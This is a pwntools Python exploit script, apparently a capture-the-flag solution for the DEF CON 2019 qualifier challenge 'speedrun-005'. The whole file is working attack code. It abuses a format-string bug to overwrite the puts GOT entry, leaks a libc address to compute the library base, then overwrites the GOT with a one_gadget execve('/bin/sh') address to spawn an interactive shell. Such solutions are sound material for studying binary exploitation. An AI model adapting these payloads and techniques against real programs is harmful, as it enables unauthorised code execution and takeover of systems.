from pwn import *

#conn = remote("speedrun-005.quals2019.oooverflow.io", 31337)
conn = process("./speedrun-005")

def trigger_fsb(payload):
	conn.recvuntil("What do you mean this time? ")
	conn.sendline(payload)

print_got = 0x601018

# make fsb payload
context.clear(arch = 'amd64')
fsb_payload = fmtstr_payload(30, writes={print_got:0x40069D}, numbwritten=(-64+24), write_size='byte')

# this function create stupid string. start payload null(\x00)
# null(\x00) is string end, printf is end. so addresses need to go to the payload end
# so,  numbwritten=(-64+24) is alreay payload(24) + got_address(-8*8=-64)
fsb_payload = fsb_payload[64:]			

# leak _IO_stdfile_1_lock
# stage 1. puts GOT overwrite FSB vuln function
payload = "%122$16lx" 		# start offset 6
payload += "A"*8
payload += fsb_payload
payload += ((8*24)-len(payload))*"A"	# padding 30-6 offset (target_offset - strat_offset)
payload += p64(print_got)
payload += p64(print_got + 1)
payload += p64(print_got + 2)
payload += p64(print_got + 3)
payload += p64(print_got + 4)
payload += p64(print_got + 5)
payload += p64(print_got + 6)
payload += p64(print_got + 6)
payload += p64(print_got + 7)

trigger_fsb(payload)

# leak libc_base
conn.recvuntil("Interesting ")
leak = int("0x"+conn.recvuntil("A"*8)[:-8].strip(),16)	# leak _IO_stdfile_1_lock
libc_base = leak - 0x3e82a0
log.info("libc_base : " + hex(libc_base))

# oneshot_gadget
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

one_gadget = libc_base + 0x10a38c	# 0x4f322 0x10a38c 0x4f2c5
log.info("one_gadget : " + hex(one_gadget))


# stage 2.
fsb_payload = fmtstr_payload(30, writes={print_got:one_gadget}, numbwritten=(-64), write_size='byte')
fsb_payload = fsb_payload[64:]			

# puts GOT overwrite one_gadget
payload  = fsb_payload	# start offset 6
payload += ((8*24)-len(payload))*"\x00"	#  [rsp+0x70] == NULL
payload += p64(print_got)
payload += p64(print_got + 1)
payload += p64(print_got + 2)
payload += p64(print_got + 3)
payload += p64(print_got + 4)
payload += p64(print_got + 5)
payload += p64(print_got + 6)
payload += p64(print_got + 6)
payload += p64(print_got + 7)


trigger_fsb(payload)


conn.interactive()